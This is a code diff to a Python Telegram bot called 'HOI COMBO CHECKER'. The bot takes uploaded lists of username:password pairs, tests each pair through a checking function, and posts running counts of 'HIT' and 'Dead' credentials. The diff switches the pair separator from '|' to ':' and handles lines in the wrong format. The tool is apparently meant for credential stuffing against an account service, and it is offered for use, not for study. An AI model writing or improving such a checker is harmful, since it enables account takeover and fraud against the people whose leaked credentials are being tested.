@@ -51,28 +51,36 @@ def handle_docs(bot, message):
 
         msg = bot.send_message(message.chat.id, initial_message, reply_markup=keyboard)
 
-        for combo in combo_list:
-            user, pwd = combo.strip().split('|')
-            result = check_hoitxt_combo(user, pwd)
-            if "HIT" in result:
-                hits.append((combo.strip(), result))
-            else:
-                dead.append((combo.strip(), result))
+        hits = []
+        dead = []
 
-            current_message = (
-                f"↯ HOI COMBO CHECKER\n\n"
-                f"COMBO CHECKING:\n{combo.strip()}\n\n"
-                f"• HIT ✅: [{len(hits)}] •\n"
-                f"• Dead ❌: [{len(dead)}] •\n"
-                f"• TOTAL: [{total_combos}] •\n"
-                f"－－－－－－－－－－－－－－－－\n"
-                f"⚫️ Total Combos - {total_combos}\n"
-                f"⏱️ Time Taken - {time.time() - start_time:.2f} seconds\n"
-                f"▫️ Checked by: {message.from_user.username}\n"
-                f"⚡️ Bot by - AFTAB 👑\n"
-                f"－－－－－－－－－－－－－－－－"
-            )
-            bot.edit_message_text(current_message, chat_id=msg.chat.id, message_id=msg.message_id, reply_markup=keyboard)
+        for combo in combo_list:
+            if ':' in combo:
+                user, pwd = combo.strip().split(':', 1)
+                result = check_hoitxt_combo(user, pwd)
+                if "HIT" in result:
+                    hits.append((combo.strip(), result))
+                else:
+                    dead.append((combo.strip(), result))
+
+                current_message = (
+                    f"↯ HOI COMBO CHECKER\n\n"
+                    f"COMBO CHECKING:\n{combo.strip()}\n\n"
+                    f"• HIT ✅: [{len(hits)}] •\n"
+                    f"• Dead ❌: [{len(dead)}] •\n"
+                    f"• TOTAL: [{total_combos}] •\n"
+                    f"－－－－－－－－－－－－－－－－\n"
+                    f"⚫️ Total Combos - {total_combos}\n"
+                    f"⏱️ Time Taken - {time.time() - start_time:.2f} seconds\n"
+                    f"▫️ Checked by: {message.from_user.username}\n"
+                    f"⚡️ Bot by - AFTAB 👑\n"
+                    f"－－－－－－－－－－－－－－－－"
+                )
+                bot.edit_message_text(current_message, chat_id=msg.chat.id, message_id=msg.message_id, reply_markup=keyboard)
+            else:
+                dead.append((combo.strip(), "Invalid format"))
+
+        bot.edit_message_text(current_message, chat_id=msg.chat.id, message_id=msg.message_id, reply_markup=keyboard)
 
     except Exception as e:
         bot.send_message(message.chat.id, f"An error occurred: {str(e)}")
